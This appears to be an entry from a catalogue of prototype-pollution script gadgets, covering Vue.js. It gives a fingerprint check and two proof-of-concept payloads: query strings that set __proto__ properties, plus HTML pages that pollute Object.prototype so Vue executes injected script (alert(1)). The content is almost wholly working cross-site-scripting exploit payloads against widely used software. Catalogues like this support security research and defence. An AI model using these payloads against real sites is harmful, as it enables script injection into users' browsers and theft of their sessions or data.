## Vue.js

URL: https://vuejs.org/

### JS Fingerprint
```
return (typeof Vue != 'undefined')
```

### PoC
#### PoC #1
```
?__proto__[v-if]=_c.constructor('alert(1)')()
```

```html
<div id="app">
    {{ message }}
</div>
<script>
    Object.prototype['v-if'] = `_c.constructor('alert(1)')()`;
</script>
<script src="https://unpkg.com/vue/dist/vue.js"></script>
<script>
var app = new Vue({ 
    el: '#app',
    data: {
        message: 'Hello Vue!'
    }
});
</script>
```

#### PoC #2
```
?__proto__[attrs][0][name]=src&__proto__[attrs][0][value]=xxx&__proto__[xxx]=data:,alert(1)//&__proto__[is]=script
```

```html
<div id="app">
    {{ message }}
</div>
<script>
    Object.prototype.attrs = [{'name':'src','value':'xxx'}];
    Object.prototype.xxx = 'data:,alert(1)//';
    Object.prototype.is = 'script';
</script>
<script src="https://unpkg.com/vue/dist/vue.js"></script>
<script>
var app = new Vue({ 
    el: '#app',
    data: {
        message: 'Hello Vue!'
    }
});
</script>
```